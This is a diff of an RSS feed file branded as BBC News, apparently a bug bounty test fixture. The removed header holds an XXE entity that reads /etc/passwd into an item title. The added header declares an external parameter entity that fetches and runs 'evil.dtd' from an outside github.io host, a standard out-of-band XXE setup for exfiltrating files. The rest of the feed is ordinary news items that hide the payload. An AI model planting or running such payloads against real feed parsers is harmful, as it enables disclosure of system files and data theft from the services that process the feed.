@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xml SYSTEM "file:///etc/passwd">]><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xml SYSTEM "https://walterbugbounty.github.io/XXE/evil.dtd"> %xml;]><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
     <channel>
         <title><![CDATA[BBC News]]></title>
         <description><![CDATA[BBC News - News Front Page]]></description>
@@ -23,7 +23,7 @@
             <media:thumbnail width="240" height="135" url="https://ichef.bbci.co.uk/ace/standard/240/cpsprodpb/f98a/live/6ca37a50-6af9-11f1-b1db-af71d47507d6.jpg"/>
         </item>
         <item>
-            <title>&xml;</title>
+            <title><![CDATA[Moscow hit by largest Ukrainian attack since start of Russia's full-scale war]]></title>
             <description><![CDATA[A refinery and a shopping centre were burning after almost 200 Ukrainian drones struck an area to the south-east of the Russian capital.]]></description>
             <link>https://www.bbc.com/news/articles/c98291g5rr1o?at_medium=RSS&amp;at_campaign=rss</link>
             <guid isPermaLink="false">https://www.bbc.com/news/articles/c98291g5rr1o#0</guid>
